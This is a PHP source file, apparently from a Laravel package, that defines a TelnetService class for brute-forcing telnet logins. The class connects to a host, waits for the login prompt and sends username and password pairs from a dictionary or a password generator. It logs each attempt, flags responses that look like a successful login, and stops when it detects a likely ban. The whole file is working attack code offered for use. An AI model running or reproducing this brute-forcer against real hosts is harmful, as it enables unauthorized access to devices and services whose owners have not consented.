<?php
/**
 * Created by PhpStorm.
 * User: Yunior
 * Date: 24/12/2022
 * Time: 11:00
 */

namespace Ycoya\LaravelTelnetBruteForce\Telnet;


class TelnetService
{
    /**
     * @var TelnetCore
     */
    protected $telnetCore;
    protected $countError = 0;
    protected $connected = false;
    protected $prompToWait = 'login:';
    protected $credentialsFound = false;
    protected $errorLogCallback;
    protected $infoLogCallback;
    protected $questionLogCallback;
    protected $nextUsernamePasswordFromDictCallback;
    protected $username;
    protected $password;
    protected $countForGeneratedPassword;
    protected $isLoginPromptReceived = false;
    protected $isFirstDictIteration = true;
    protected $continueRunning = true;


    public function __construct($host = '127.0.0.1', $port = 23, $connect_timeout = 1.0, $socket_timeout = 10.0, $full_line_timeout = 0.10)
    {
        $this->telnetCore = new TelnetCore($host, intval($port), floatval($connect_timeout), floatval($socket_timeout), '$', floatval($full_line_timeout));
        $this->setPrompToWait($this->prompToWait);
    }


    public function bruteForceWithDictionary()
    {
        do {
            $this->connect();
            $this->waitLoginPrompt();
            $areCredentialsFound = $this->login();
        } while (!$areCredentialsFound && $this->continueRunning && $this->countError < 50);

        return $areCredentialsFound;
    }


    public function bruteForceWithPasswordGenerated($passwordGenerated, $count)
    {
        $this->password = $passwordGenerated;
        $this->countForGeneratedPassword = $count;
        do {
            $this->connect();
            $this->waitLoginPrompt();
            $credentialsFound = $this->login(true);
        } while (!$credentialsFound && !$this->connected);

        return $credentialsFound;
    }


    public function connect()
    {
        if (!$this->connected) {
            try {
                $this->telnetCore->connect();
                $this->connected = true;
                $this->countError = 0;
                $this->logInfo("telnet connected...");
            } catch (\Exception $e) {
                $this->connected = false;
                $this->logError("connected: " . $e->getMessage());
                $this->countError++;
                sleep(1);
            }
        }
    }

    public function disconnect()
    {
        $this->telnetCore->disconnect();
    }

    public function waitLoginPrompt()
    {
        if ($this->connected && !$this->isLoginPromptReceived) {
            $notPromptFound = false;
            $count = 0;
            do {
                try {
                    $this->telnetCore->waitForLoginPrompt();
                    $notPromptFound = false;
                } catch (\Exception $e) {
                    if (str_contains($e->getMessage(), "not prompt")) {
                        $count++;
                        $notPromptFound = true;
                        $this->logError("error waiting-login-prompt not prompt: " . $e->getMessage());
                    } else {
                        $this->connected = false;
                        $this->isLoginPromptReceived = false;
                        $this->logError("error waiting-login-prompt: " . $e->getMessage());
                        break;
                    }
                }
                if($count >= 5) {
                    $this->logError("waiting-login-prompt: probably banned." );
                    exit;
                }
            } while ( $notPromptFound );
        }

    }


    /**
     * This is executed when knowing that login prompt is asking the telnet. Then we send the password and expect to receive the login prompt again which
     * means the login failed. If an exception timed out is thrown, it could be mean one from two things.
     * 1. Session is over.
     * 2. We are logged in.
     * @param bool $usingPasswordGenerated
     * @return bool
     */
    public function login($usingPasswordGenerated = false)
    {
        if ($this->connected) {
            $isPasswordWrong = true;
            if(!$usingPasswordGenerated) {
                if($this->credentialsEmptyFirstIteration()) {
                    return $this->credentialsFound;
                }
            }
            do {
                try {
                    $this->logInfo("login-sendingusername: sending: $this->username" );
                    $this->telnetCore->sendUsername($this->username);
                } catch (\Exception $e) {
                    $this->logError("error login-sendingusername: sending $this->username " . $e->getMessage());
                    $this->connected = false;
                    break;
                }
                try {
                    $this->logInfo("login-waitingForPasswordPromptAndSend: sending password: $this->password" );
                    $this->telnetCore->waitForPasswordPromptAndSend($this->password);
                    $this->isLoginPromptReceived = true;
                } catch (\Exception $e) {
                    $response = $this->telnetCore->getTmpBuffer();
                    if ($response != "" && preg_match("/login/i", $response) != true) {
                        $isPasswordWrong = false;
                        $this->logQuestion("login-waitingForPasswordPromptAndSend possible login success for: $this->username:$this->password");
                        return $this->credentialsFound = true;
                    }
                    $this->telnetCore->clearTmpBuffer();
                    $this->logError("error login-waitingForPasswordPromptAndSend: " . $e->getMessage());
                    $this->connected = false;
                    $this->isLoginPromptReceived = false;
                    break;
                }

                if (!$usingPasswordGenerated) {
                    if ($this->credentialsEmpty()) {
                        return $this->credentialsFound;
                    }
                }
            } while ($isPasswordWrong && !$usingPasswordGenerated);
        }

        return $this->credentialsFound;
    }

    public function credentialsEmptyFirstIteration()
    {
        if($this->isFirstDictIteration) {
            $isEmpty = $this->credentialsEmpty();
            $this->isFirstDictIteration = false;
            return  $isEmpty;
        }
    }

    public function credentialsEmpty()
    {
        $credentials = $this->nextNewUsernamePassword();
        if(empty($credentials)) {
            $this->continueRunning = false;
            return true;
        }
        $this->username = $credentials["username"];
        $this->password = $credentials["password"];
        return false;
    }


    /**
     * @return string
     */
    public function getPrompToWait(): string
    {
        return $this->prompToWait;
    }

    /**
     * @param string $prompToWait
     */
    public function setPrompToWait(string $prompToWait): void
    {
        $this->prompToWait = $prompToWait;
        $this->telnetCore->setPrompt($prompToWait);
    }

    public function setPruneCtrlSeq($enable = true)
    {
        //Enable this to filter out ANSI control/escape sequences
        $this->telnetCore->setPruneCtrlSeq($enable);
    }

    /**
     * @return bool
     */
    public function isConnected(): bool
    {
        return $this->connected;
    }

    /**
     * @return TelnetCore
     */
    public function getTelnetCore(): TelnetCore
    {
        return $this->telnetCore;
    }

    /**
     * @return bool
     */
    public function isContinueRunning(): bool
    {
        return $this->continueRunning;
    }

    /**
     * @return \Closure||Array||mixed
     */
    public function getErrorLogCallback(): \Closure
    {
        return $this->errorLogCallback;
    }

    /**
     * @param \Closure||Array||mixed $errorLogCallback
     */
    public function setErrorLogCallback(mixed $errorLogCallback): void
    {
        $this->errorLogCallback = $errorLogCallback;
    }

    /**
     * @return \Closure||Array||mixed $infoLogCallback
     */
    public function getInfoLogCallback()
    {
        return $this->infoLogCallback;
    }

    /**
     * @param \Closure||Array||mixed $infoLogCallback
     */
    public function setInfoLogCallback(mixed $infoLogCallback): void
    {
        $this->infoLogCallback = $infoLogCallback;
    }

    /**
     * @return \Closure||Array||mixed
     */
    public function getQuestionLogCallback()
    {
        return $this->questionLogCallback;
    }

    /**
     * @param \Closure||Array||mixed $questionLogCallback
     */
    public function setQuestionLogCallback($questionLogCallback): void
    {
        $this->questionLogCallback = $questionLogCallback;
    }

    /**
     * @return \Closure||Array||mixed
     */
    public function getNextUsernamePasswordFromDictCallback()
    {
        return $this->nextUsernamePasswordFromDictCallback;
    }

    /**
     * @param mixed $nextUsernamePasswordFromDictCallback
     */
    public function setNextUsernamePasswordFromDictCallback($nextUsernamePasswordFromDictCallback): void
    {
        $this->nextUsernamePasswordFromDictCallback = $nextUsernamePasswordFromDictCallback;
    }

    protected function logInfo(string $info)
    {
        \Log::info(class_basename($this) ."::$info");
        if(!is_null($this->infoLogCallback)) {
            call_user_func($this->infoLogCallback, $info);
        }
    }

    protected function logError(string $error)
    {
        \Log::error(class_basename($this) ."::$error");
        if(!is_null($this->errorLogCallback)) {
            call_user_func($this->errorLogCallback, $error);
        }
    }


    protected function logQuestion(string $text)
    {
        \Log::info(class_basename($this) ."::$text");
        if(!is_null($this->questionLogCallback)) {
            call_user_func($this->questionLogCallback, $text);
        }
    }

    protected function nextNewUsernamePassword()
    {
        if(!is_null($this->nextUsernamePasswordFromDictCallback)) {
            return call_user_func($this->nextUsernamePasswordFromDictCallback);
        }
        return ["username" => "telnet", "password" => "password"];
    }

    /**
     * @return mixed
     */
    public function getUsername()
    {
        return $this->username;
    }

    /**
     * @param mixed $username
     */
    public function setUsername($username): void
    {
        $this->username = $username;
    }

    /**
     * @return mixed
     */
    public function getPassword()
    {
        return $this->password;
    }

    /**
     * @param mixed $password
     */
    public function setPassword($password): void
    {
        $this->password = $password;
    }

    /**
     * @return mixed
     */
    public function getCountForGeneratedPassword()
    {
        return $this->countForGeneratedPassword;
    }
}